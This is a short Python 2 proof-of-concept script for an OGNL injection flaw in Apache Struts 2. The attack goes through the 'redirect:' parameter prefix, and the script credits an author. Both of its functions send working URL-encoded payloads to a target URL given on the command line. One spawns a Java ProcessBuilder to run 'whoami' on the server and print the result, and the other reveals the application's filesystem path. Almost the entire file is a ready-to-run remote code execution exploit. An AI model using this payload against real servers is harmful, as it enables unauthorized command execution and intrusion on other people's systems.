#coding:utf-8

__author__ = 'PeiZhihong'

import sys
import requests

red = '\x1b[1;31m'
green = '\x1b[1;32m'
yellow = '\x1b[1;33m'
blue = '\x1b[1;34m'
clear = '\x1b[0m'


def st2User(url):
	data = "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
	myString = url + "?" + data
	res = requests.get('%s' % myString,timeout=10)
	response = res.text.strip()
	print '''%sThe Web Application User is:%s\n%s%s%s
	''' % (blue,clear,yellow,response,clear)  

def st2Path(url):
	data = "redirect:${%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath('/'),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
	myString = url + "?" + data
	res = requests.get('%s' % myString,timeout=10)
	response = res.text.strip()
	print '''%sThe Web Application Path is:%s\n%s%s%s  
	''' % (green,clear,yellow,response,clear)

if __name__ == '__main__':
	url = sys.argv[1]
	print '%sThe POC author is: %s%s\n' % (red,__author__,clear)
	st2User(url)
	st2Path(url)
